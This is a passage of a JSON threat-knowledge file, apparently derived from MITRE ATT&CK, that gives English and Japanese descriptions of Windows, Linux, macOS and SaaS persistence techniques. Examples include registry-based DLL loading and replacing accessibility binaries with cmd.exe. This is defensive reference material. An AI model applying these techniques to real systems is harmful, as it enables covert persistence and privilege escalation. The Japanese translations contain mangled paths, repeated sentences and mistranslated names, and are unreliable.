                        "description_eng": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code> value in the Registry keys <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> or <code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. (Citation: Elastic Process Injection July 2017)\n\nSimilar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. (Citation: AppInit Registry) Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. \n\nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled. (Citation: AppInit Secure Boot)",
                        "description_jp": "攻撃者は、プロセスにロードされた AppInit DLL をトリガーとして悪意のあるコンテンツを実行することで、永続性を確立したり、特権を昇格させたりする可能性があります。レジストリキー <code>HKEY_LOCAL_MACHINE_SoftwareMicrosoftWindows NTCurrentVersionWindows</code> または <code>HKEY_LOCAL_MACHINE_SoftwareWow6432NodeMicrosoftWindows NTCurrentVersionWindows</code> の <code>AppInit_DLLs</code> 値で指定されているダイナミックリンクライブラリ (DLL) は、user32.dll をロードするすべてのプロセスにロードされます。dllは、user32.dllをロードするすべてのプロセスにロードされる。user32.dllは非常に一般的なライブラリであるため、実際にはほとんどすべてのプログラムにロードされます。(引用：Elastic Process Injection 2017年7月号)\n\nプロセスインジェクションと同様に、これらの値を悪用して悪意のあるDLLをロードさせ、コンピュータ上の別のプロセスのコンテキストで実行させることで、昇格した特権を取得することができます。(引用：AppInit Registry） また、悪意のあるAppInit DLLは、APIアクティビティによって継続的にトリガーされることで、永続性を提供する可能性もあります。\n\nWindows 8 以降のバージョンでは、セキュアブートが有効になっている場合、AppInit DLL の機能は無効になります。(引用：AppInit セキュアブート）"
                    },
                    {
                        "id": "T1546.005",
                        "name_eng": "Trap",
                        "name_jp": "トラップ",
                        "description_eng": "Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>.\n\nAdversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where \"command list\" will be executed when \"signals\" are received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements)",
                        "description_jp": "攻撃者は、割り込みシグナルをトリガーとして悪意のあるコンテンツを実行することで、永続性を確立することができる。<code>trap</code>コマンドは、プログラムやシェルが割り込みシグナルを受信したときに実行されるコマンドを指定できるようにします。よくある状況は、<code>ctrl+c</code> や <code>ctrl+d</code>のような一般的なキーボード割り込みの優雅な終了と処理を可能にするスクリプトです。\n\n攻撃者はこれを利用して、シェルが特定の割り込みに遭遇したときに実行するコードを、永続化メカニズムとして登録することができる。トラップコマンドは以下の形式である。 <code>trap 'command list' signals</code> ここで、\"command list \"は \"signals \"を受信したときに実行される。(引用：トラップマニュアル)(引用：Cyberciti Trap Statements)"
                    },
                    {
                        "id": "T1546.007",
                        "name_eng": "Netsh Helper DLL",
                        "name_jp": "NetshヘルパーDLL",
                        "description_eng": "Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.(Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>.\n\nAdversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.(Citation: Github Netsh Helper CS Beacon)(Citation: Demaske Netsh Persistence)",
                        "description_jp": "攻撃者は、Netsh Helper DLL によって引き起こされる悪意のあるコンテンツを実行することで、永続性を確立する可能性があります。Netsh.exe (Netshell とも呼ばれる) は、システムのネットワーク構成と対話するために使用されるコマンドライン スクリプト ユーティリティです。このユーティリティには、ユーティリティの機能を拡張するためのヘルパー DLL を追加する機能が含まれています (引用: TechNet Netsh)。登録された netsh.exe ヘルパー DLL へのパスは、Windows レジストリの <code>HKLMSOFTWARE\\MicrosoftNetsh<//code> に入力されます。\n\n攻撃者は、netsh.exeヘルパーDLLを使用して、任意のコードを持続的に実行させることができる。この実行は、netsh.exeが実行されればいつでも行われることになり、自動的、別の永続化手法、または通常の機能の一部としてnetsh.exeを実行する他のソフトウェア（例：VPN）がシステム上に存在する場合に発生する可能性がある。 引用：Github Netsh Helper CS Beacon）（引用：Demaske Netsh Persistence）。"
                    },
                    {
                        "id": "T1546.012",
                        "name_eng": "Image File Execution Options Injection",
                        "name_jp": "画像ファイル実行オプション・インジェクション",
                        "description_eng": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., <code>C:\\dbg\\ntsd.exe -g  notepad.exe</code>). (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable></code> where <code>&lt;executable&gt;</code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)\n\nSimilar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures \"cmd.exe,\" or another program that provides backdoor access, as a \"debugger\" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the \"debugger\" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Elastic Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.\n\nMalware may also use IFEO to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)",
                        "description_jp": "攻撃者は、イメージファイル実行オプション（IFEO）デバッガによって引き起こされる悪意のあるコンテンツを実行することで、永続性を確立したり、特権を昇格させたりする可能性があります。IFEO は、開発者がアプリケーションにデバッガをアタッチすることを可能にします。プロセスが作成されると、アプリケーションの IFEO に存在するデバッガーがアプリケーション名の前に追加され、デバッガーの下で新しいプロセスが効果的に起動されます (例: <code>C:³³³³.exe -g notepad.exe</code>)。(引用: Microsoft Dev Blog IFEO Mar 2010)\n\nIFEOは、レジストリを介して直接設定するか、GFlagsツールを介してグローバルフラグに設定することができます。(引用: Microsoft GFlags Mar 2017) IFEO は、レジストリの <code>HKLMSOFTWARE{Wow6432Node}MicrosoftWindows NTCurrentVersionImage File Execution Options<executable></code> の <code>Debugger</code> 値として表され、<code>&lt;executable&gt;</code> はデバッガーがアタッチされているバイナリです。(引用：Microsoft Dev Blog IFEO Mar 2010）\n\nIFEO を使用すると、指定したプログラムがサイレント終了 (それ自身または 2 番目の非カーネル モード プロセスによって早期終了) したときに、任意のモニター プログラムを起動することもできます。(引用: Microsoft Silent Process Exit NOV 2017) (引用: Oddvar Moe IFEO APR 2018) デバッガーと同様に、サイレント終了監視は、GFlags を通して、または <code>HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindows NTのIFEOおよびサイレント終了レジストリ値を直接変更することによって有効にすることができます。(引用：Microsoft Silent Process Exit NOV 2017）（引用：Oddvar Moe IFEO APR 2018）\n\nアクセシビリティ機能](https://attack.mitre.org/techniques/T1546/008)と同様に、Windows Vista以降およびWindows Server 2008以降では、「cmd.exe」またはバックドアアクセスを提供する別のプログラムを、アクセシビリティプログラム(ex: utilman.exe)の「デバッガ」として設定するレジストリキーが変更される可能性があります。レジストリが変更された後、キーボードを操作しているときにログイン画面で適切なキーの組み合わせを押すか、[リモート・デスクトップ・プロトコル](https://attack.mitre.org/techniques/T1021/001)で接続すると、「デバッガー」プログラムがSYSTEM権限で実行されるようになります。(引用：ティルベリー2014）\n\nプロセスインジェクション](https://attack.mitre.org/techniques/T1055)と同様に、これらの値を悪用して、悪意のある実行ファイルをコンピュータ上の別のプロセスのコンテキストで読み込ませて実行させることで、特権の昇格を得ることもできます。(引用: Elastic Process Injection July 2017) IFEO メカニズムをインストールすることは、継続的なトリガー呼び出しによって永続性を提供する可能性もある。\n\nまた、マルウェアはIFEOを使用して、様々なシステムやセキュリティアプリケーションをリダイレクトし、効果的に無効にする無効なデバッガを登録することで、[Impair Defenses](https://attack.mitre.org/techniques/T1562)を行う可能性があります。(引用：FSecure Hupigon) (引用：Symantec Ushedix June 2008)"
                    },
                    {
                        "id": "T1546.001",
                        "name_eng": "Change Default File Association",
                        "name_jp": "デフォルトのファイルの関連付けを変更する",
                        "description_eng": "Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility.(Citation: Microsoft Change Default Programs)(Citation: Microsoft File Handlers)(Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\n\nSystem file associations are listed under <code>HKEY_CLASSES_ROOT\\.[extension]</code>, for example <code>HKEY_CLASSES_ROOT\\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\\\\[handler]</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\\\\[handler]\\shell\\\\[action]\\command</code>. For example: \n\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code>\n* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command</code>\n\nThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.(Citation: TrendMicro TROJ-FAKEAV OCT 2012)",
                        "description_jp": "攻撃者は、ファイルタイプの関連付けをトリガーとして悪意のあるコンテンツを実行することで、永続性を確立する可能性がある。ファイルを開くと、そのファイルを開くために使用されるデフォルトのプログラム（ファイルの関連付けまたはハンドラとも呼ばれる）がチェックされる。ファイルの関連付けの選択は Windows レジストリに保存され、レジストリにアクセスできるユーザー、管理者、プログラム、または管理者が組み込みの assoc ユーティリティを使用して編集することができます。(引用: Microsoft Change Default Programs)(Citation: Microsoft File Handlers)(Citation: Microsoft Assoc Oct 2017) アプリケーションは、指定された拡張子のファイルが開かれたときに任意のプログラムを呼び出すように、指定された拡張子のファイルの関連付けを変更することができます。\n\nシステムファイルの関連付けは、<code>HKEY_CLASSES_ROOT</code>.[拡張子]</code>の下にリストされており、例えば<code>HKEY_CLASSES_ROOT</code>.txt</code>のようになる。エントリは、<code>HKEY_CLASSES_ROOT</code>[handler]</code>にあるその拡張のハンドラを指す。そして、様々なコマンドは、<code>HKEY_CLASSES_ROOT</code>のシェルキーの下のサブキーとして、<code>HKEY_CLASSES_ROOT</code>[handler]</code>にあるシェルキーの下にリストされる。例えば\n\n<code>HKEY_CLASSES_ROOT ￤txtfile ￤shell ￤command</code> でシェルキーを使用します。\n* <code>HKEY_CLASSES_ROOTtxtfile\\shellprint</code>\n* <code>HKEY_CLASSES_ROOTtxtfile\\shellprinttocommand</code>\n\n列挙されたキーの値は、ハンドラーがファイル拡張子を開いたときに実行されるコマンドである。攻撃者はこれらの値を変更することで、任意のコマンドを継続的に実行することができます。 (引用: TrendMicro TROJ-FAKEAV OCT 2012)"
                    },
                    {
                        "id": "T1546.009",
                        "name_eng": "AppCert DLLs",
                        "name_jp": "AppCert DLLs",
                        "description_eng": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code> Registry key under <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Session Manager\\</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, or <code>WinExec</code>. (Citation: Elastic Process Injection July 2017)\n\nSimilar to [Process Injection](https://attack.mitre.org/techniques/T1055), this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity.",
                        "description_jp": "攻撃者は、プロセスにロードされたAppCert DLLをトリガーとして悪意のあるコンテンツを実行することで、永続性を確立したり、特権を昇格させたりする可能性があります。<code>HKEY_LOCAL_MACHINESystemCurrentControlSet\\ControlSession Manager</code>下の<code>AppCertDLLs</code>レジストリキーで指定されるダイナミックリンクライブラリ（DLL）は、広く使用されているアプリケーションプログラミングインターフェース（API）関数<code>CreateProcess</code>を呼び出すすべてのプロセスにロードされます、<code>CreateProcessAsUser</code>、<code>CreateProcessWithLoginW</code>、<code>CreateProcessWithTokenW</code>、<code>WinExec</code> を呼び出すすべてのプロセスにロードされます。(引用：Elastic Process Injection 2017年7月号）\n\nプロセスインジェクション](https://attack.mitre.org/techniques/T1055)と同様に、この値を悪用して、悪意のあるDLLをロードさせ、コンピュータ上の別のプロセスのコンテキストで実行させることで、昇格した権限を取得することができます。また、悪意のあるAppCert DLLは、APIアクティビティによって継続的にトリガーされることで、永続性を提供する可能性もある。"
                    },
                    {
                        "id": "T1546.017",
                        "name_eng": "Udev Rules",
                        "name_jp": "ウデブ・ルール",
                        "description_eng": "Adversaries may maintain persistence through executing malicious content triggered using udev rules. Udev is the Linux kernel device manager that dynamically manages device nodes, handles access to pseudo-device files in the `/dev` directory, and responds to hardware events, such as when external devices like hard drives or keyboards are plugged in or removed. Udev uses rule files with `match keys` to specify the conditions a hardware event must meet and `action keys` to define the actions that should follow. Root permissions are required to create, modify, or delete rule files located in `/etc/udev/rules.d/`, `/run/udev/rules.d/`, `/usr/lib/udev/rules.d/`, `/usr/local/lib/udev/rules.d/`, and `/lib/udev/rules.d/`. Rule priority is determined by both directory and by the digit prefix in the rule filename.(Citation: Ignacio Udev research 2024)(Citation: Elastic Linux Persistence 2024)\n\nAdversaries may abuse the udev subsystem by adding or modifying rules in udev rule files to execute malicious content. For example, an adversary may configure a rule to execute their binary each time the pseudo-device file, such as `/dev/random`, is accessed by an application. Although udev is limited to running short tasks and is restricted by systemd-udevd's sandbox (blocking network and filesystem access), attackers may use scripting commands under the action key `RUN+=` to detach and run the malicious content’s process in the background to bypass these controls.(Citation: Reichert aon sedexp 2024)",
                        "description_jp": "攻撃者は、udev ルールを使用してトリガーされた悪意のあるコンテンツを実行することで、永続性を維持する可能性があります。Udev は Linux カーネルのデバイス・マネージャーで、デバイス・ノードを動的に管理し、`/dev` ディレクトリにある擬似デバイス・ファイルへのアクセスを処理し、ハード・ドライブやキーボードなどの外部デバイスが接続されたり取り外されたりしたときのようなハードウェア・イベントに応答します。Udev は `match キー` でハードウェアイベントが満たすべき条件を指定し、`action キー` でその後のアクションを定義するルールファイルを使用する。etc/udev/rules.d/`、`/run/udev/rules.d/`、`/usr/lib/udev/rules.d/`、`/usr/local/lib/udev/rules.d/`、`/lib/udev/rules.d/` にあるルールファイルを作成、変更、削除するには root 権限が必要です。ルールの優先順位は、ディレクトリと、ルールファイル名に含まれる数字のプレフィックスによって決まる。(引用: Ignacio Udev research 2024)(Citation: Elastic Linux Persistence 2024)\n\n攻撃者は、悪意のあるコンテンツを実行するためにudevルールファイルにルールを追加または変更することで、udevサブシステムを悪用する可能性があります。例えば、敵は `/dev/random` のような疑似デバイスファイルがアプリケーションによってアクセスされるたびに、自分のバイナリを実行するようにルールを設定するかもしれません。udevは短いタスクの実行に制限されており、systemd-udevdのサンドボックス（ネットワークとファイルシステムへのアクセスをブロック）によって制限されていますが、攻撃者はアクションキー`RUN+=`の下でスクリプトコマンドを使用して、これらの制御をバイパスするためにバックグラウンドで悪意のあるコンテンツのプロセスを切り離して実行することができます（引用：Reichert aon sedexp 2024）。"
                    },
                    {
                        "id": "T1546.014",
                        "name_eng": "Emond",
                        "name_jp": "エモンド",
                        "description_eng": "Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place.\n\nThe rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)\n\nAdversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) service.",
                        "description_jp": "攻撃者は、Event Monitor Daemon (emond)によってトリガーされた悪意のあるコンテンツを実行することで、永続性を獲得し、特権を昇格させる可能性がある。emondは[Launch Daemon](https://attack.mitre.org/techniques/T1543/004)であり、様々なサービスからイベントを受け取り、シンプルなルールエンジンを通して実行し、アクションを起こします。<code>/sbin/emond</code> にある emond バイナリは、<code>/etc/emond.d/rules/</code> ディレクトリから任意のルールをロードし、明示的に定義されたイベントが発生するとアクションを実行します。\n\nルールファイルは plist 形式で、名前、イベントタイプ、実行するアクションを定義します。イベントタイプの例としては、システムの起動やユーザー認証などがあります。アクションの例としては、システムコマンドの実行や電子メールの送信などがあります。<code>/System/Library/LaunchDaemons/com.apple.emond.plist<//code>にある[Launch Daemon](https://attack.mitre.org/techniques/T1543/004)設定ファイルで指定されたQueueDirectoriesパス<code>/private/var/db/emondClients<//code>にファイルが存在しない場合、emondサービスは起動しません。(引用: xorrior emond 2018年1月)(引用: magnusviri emond 2016年4月)(引用: sentinelone macos persist 2019年6月)\n\nシステム起動やユーザー認証など、定義されたイベントが発生したときにコマンドを実行するルールを記述することで、このサービスを悪用する可能性がある(引用: xorrior emond 2018年1月)(引用: magnusviri emond 2016年4月)(引用: sentinelone macos persist 2019年6月) また、emondサービスは[Launch Daemon](https://attack.mitre.org/techniques/T1543/004) サービスによってroot権限で実行されるため、悪用者は管理者からrootに権限を昇格させることができる可能性がある。"
                    },
                    {
                        "id": "T1546.008",
                        "name_eng": "Accessibility Features",
                        "name_jp": "アクセシビリティの特徴",
                        "description_eng": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\n\nTwo common accessibility programs are <code>C:\\Windows\\System32\\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\\Windows\\System32\\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \"sticky keys\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)\n\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.\n\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\\Windows\\System32\\utilman.exe</code>) may be replaced with \"cmd.exe\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\n\nOther accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)\n\n* On-Screen Keyboard: <code>C:\\Windows\\System32\\osk.exe</code>\n* Magnifier: <code>C:\\Windows\\System32\\Magnify.exe</code>\n* Narrator: <code>C:\\Windows\\System32\\Narrator.exe</code>\n* Display Switcher: <code>C:\\Windows\\System32\\DisplaySwitch.exe</code>\n* App Switcher: <code>C:\\Windows\\System32\\AtBroker.exe</code>",
                        "description_jp": "攻撃者は、アクセシビリティ機能をトリガーとして悪意のあるコンテンツを実行することで、永続性を確立したり、特権を昇格させたりする可能性がある。Windowsには、ユーザがログインする前（例：ユーザがWindowsのログオン画面にいるとき）に、キーの組み合わせで起動できるアクセシビリティ機能があります。敵は、これらのプログラムの起動方法を変更することで、システムにログインせずにコマンドプロンプトやバックドアを取得することができます。\n\n一般的なアクセシビリティプログラムは、シフトキーを5回押したときに起動する<code>C:¥WindowsSystem32¥sethc.exe</code>と、Windows + Uキーの組み合わせを押したときに起動する<code>C:¥WindowsSystem32¥utilman.exe</code>の2つです。sethc.exeプログラムは、しばしば「スティッキーキー」と呼ばれ、敵対者によってリモートデスクトップのログイン画面を介して認証されていないアクセスに使用されている。(引用：FireEye Hikit Rootkit)\n\nWindowsのバージョンによって、敵対者はさまざまな方法でこれらの機能を利用する可能性がある。敵対者が使用する一般的な方法には、レジストリ内のアクセシビリティ機能のバイナリ、またはこれらのバイナリへのポインタ/参照を置き換えることが含まれます。Windows の新しいバージョンでは、置き換えられたバイナリは x64 システム用にデジタル署名されている必要があり、バイナリは <code>%systemdir%<//code> に存在する必要があり、Windows File or Resource Protection (WFP/WRP) によって保護されている必要があります。(引用: DEFCON2016 Sticky Keys) [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012)デバッガー手法は、対応するアクセシビリティ機能バイナリを置き換える必要がないため、潜在的な回避策として発見された可能性が高い。\n\nWindows XP以降やWindows Server 2003/R2以降での単純なバイナリの置き換えでは、例えば、プログラム（例えば、<code>C:³³System32³³utilman.exe</code>）を「cmd.exe」（またはバックドアアクセスを提供する他のプログラム）に置き換えることができる。その後、キーボードの前に座った状態でログイン画面で適切なキーの組み合わせを押すか、[リモートデスクトッププロトコル](https://attack.mitre.org/techniques/T1021/001)で接続すると、置き換えられたファイルがSYSTEM権限で実行されます。(引用：Tilbury 2014）\n\n同様の方法で活用される可能性のある他のアクセシビリティ機能も存在する：(引用：DEFCON2016 Sticky Keys)(引用：Narrator Accessibility Abuse)\n\n* オンスクリーンキーボード：<code>C:◆WindowsSystem32◆osk.exe</code>。\n* 拡大鏡：拡大鏡：<code>C:¥Windows¥System32¥Magnify.exe</code\n* ナレーター：<code>C:¥Windows¥System32¥Narrator.exe<//code\n* ディスプレイスイッチャー：<code>C:¥Windows¥System32¥DisplaySwitch.exe<//code\n* App Switcher：App Switcher: <code>C:¥Windows¥System32¥AtBroker.exe<//code"
                    }
                ]
            },
            {
                "id": "T1671",
                "name_eng": "Cloud Application Integration",
                "name_jp": "クラウドアプリケーションの統合",
                "description_eng": "Adversaries may achieve persistence by leveraging OAuth application integrations in a software-as-a-service environment. Adversaries may create a custom application, add a legitimate application into the environment, or even co-opt an existing integration to achieve malicious ends.(Citation: Push Security SaaS Persistence 2022)(Citation: SaaS Attacks GitHub Evil Twin Integrations)\n\nOAuth is an open standard that allows users to authorize applications to access their information on their behalf. In a SaaS environment such as Microsoft 365 or Google Workspace, users may integrate applications to improve their workflow and achieve tasks.  \n\nLeveraging application integrations may allow adversaries to persist in an environment – for example, by granting consent to an application from a high-privileged adversary-controlled account in order to maintain access to its data, even in the event of losing access to the account.(Citation: Wiz Midnight Blizzard 2024)(Citation: Microsoft Malicious OAuth Applications 2022)(Citation: Huntress Persistence Microsoft 365 Compromise 2024) In some cases, integrations may remain valid even after the original consenting user account is disabled.(Citation: Push Security Slack Persistence 2023) Application integrations may also allow adversaries to bypass multi-factor authentication requirements through the use of [Application Access Token](https://attack.mitre.org/techniques/T1550/001)s. Finally, they may enable persistent [Automated Exfiltration](https://attack.mitre.org/techniques/T1020) over time.(Citation: Synes Cyber Corner Malicious Azure Application 2023)\n\nCreating or adding a new application may require the adversary to create a dedicated [Cloud Account](https://attack.mitre.org/techniques/T1136/003) for the application and assign it [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003) – for example, in Microsoft 365 environments, an application can only access resources via an associated service principal.(Citation: Microsoft Entra ID Service Principals)",
                "description_jp": "攻撃者は、SaaS（Software-as-a-Service）環境における OAuth アプリケーションの統合を活用することで、永続性を達成する可能性があります。攻撃者は、カスタムアプリケーションを作成したり、正規のアプリケーションを環境に追加したり、あるいは悪意のある目的を達成するために既存の統合を利用したりする可能性がある。 引用：Push Security SaaS Persistence 2022）（引用：SaaS Attacks GitHub Evil Twin Integrations\n\nOAuthは、ユーザーが自分の代わりに自分の情報にアクセスするアプリケーションを承認することを可能にするオープンスタンダードです。Microsoft 365やGoogle WorkspaceのようなSaaS環境では、ユーザーはワークフローを改善し、タスクを達成するためにアプリケーションを統合することができる。  \n\nアプリケーションの統合を活用することで、例えば、敵対者がコントロールする高特権のアカウントからアプリケーションに同意を与えることで、そのアカウントへのアクセスが失われた場合でも、そのデータへのアクセスを維持することができるなど、敵対者が環境に永続することが可能になるかもしれません。(引用: Wiz Midnight Blizzard 2024)(引用: Microsoft Malicious OAuth Applications 2022)(引用: Huntress Persistence Microsoft 365 Compromise 2024) 場合によっては、同意した元のユーザアカウントが無効化された後でも、統合が有効なままであることがあります(引用: Push Security Slack Persistence 2023) アプリケーションの統合によって、敵対者は[Application Access Token](https://attack.mitre.org/techniques/T1550/001)の使用を通じて、多要素認証要件を回避することもできます。最後に、これらのアプリケーションは、長期にわたって持続的な[自動流出](https://attack.mitre.org/techniques/T1020)を可能にする可能性があります。(引用: Synes Cyber Corner Malicious Azure Application 2023)\n\n例えば、Microsoft 365 の環境では、アプリケーションは関連するサービスプリンシパルを介してのみリソースにアクセスすることができます。",
                "subtechniques": []
            },
            {
                "id": "T1197",
                "name_eng": "BITS Jobs",
                "name_jp": "BITSの求人",
                "description_eng": "Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation: Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.\n\nThe interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation: Microsoft BITS)(Citation: Microsoft BITSAdmin)\n\nAdversaries may abuse BITS to download (e.g. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)), execute, and even clean up after running malicious code (e.g. [Indicator Removal](https://attack.mitre.org/techniques/T1070)). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.(Citation: CTU BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS May 2007)(Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware June 2016)\n\nBITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware June 2016)",
